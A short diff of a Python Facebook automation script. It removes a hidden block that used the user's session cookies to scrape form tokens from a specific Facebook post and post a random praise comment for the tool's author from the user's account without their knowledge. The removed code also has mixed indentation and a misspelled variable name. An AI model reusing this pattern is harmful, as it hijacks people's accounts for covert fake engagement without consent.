@@ -22,16 +22,6 @@ def menu():
 		cookie = {"cookie":cok}
 		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
 	except:
-           pass
-        try:
-           kmn=ses.get("https://www.facebook.com/muhammad.firza.75055/posts/pfbid0zfEVEX9UP1cdvnAGSwD9xb83gWn3t6Uy2Xcf1R2krczdJ7neRJQsSCvqiw21g34el",cookies=cokie).text
-           kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
-           dt=kmn.find_all("input",type="hidden")
-           text=["Hi bang Ikfar tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ikfar-Bot","semoga rejeki bang Ikfar di lancarin amin","tools yang sangat bagus!","be yourself and never surrender"]
-           random_komen=random.choice(text)
-           ses.post(mbasic.format(kmn["action"]),data={"fb_dtsg":dt[0]["value"],"jazoest":dt[1]["value"],"comment_text":random_komen},cookies=cokie)
-	except:
-           pass
 		login()
 	print(f" selamat datang {nama}, silahkan pakai sesuka hati")
 	idt = input(" masukan link : ")
